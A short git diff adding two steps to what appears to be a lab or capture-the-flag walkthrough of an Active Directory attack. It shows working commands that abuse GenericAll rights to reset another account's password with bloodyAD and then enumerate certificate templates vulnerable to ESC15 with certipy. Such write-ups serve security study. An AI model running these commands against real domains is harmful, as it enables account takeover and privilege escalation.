@@ -92,6 +92,12 @@
 
 ![image](https://github.com/user-attachments/assets/6a82727a-bf1b-4bcc-9990-d8539361fcef)
 
-17. 
+17. Success! Now, change cert_admin's password using John's GenericAll privs on that account
+`sudo python3 /opt/bloodyAD/bloodyAD.py --host 10.129.47.78 -u john -p Password123 set password cert_admin Summer2025`
+
+18. With cert_admin's account, we naturally enumerate for vulnerable certificate templates with certipy. Certipy returns a WebServer template that's vulnerable to ESC15
+`certipy find -u cert_admin -p Summer2025 -dc-ip 10.129.47.78 -enabled -vulnerable`
+
+
 
 
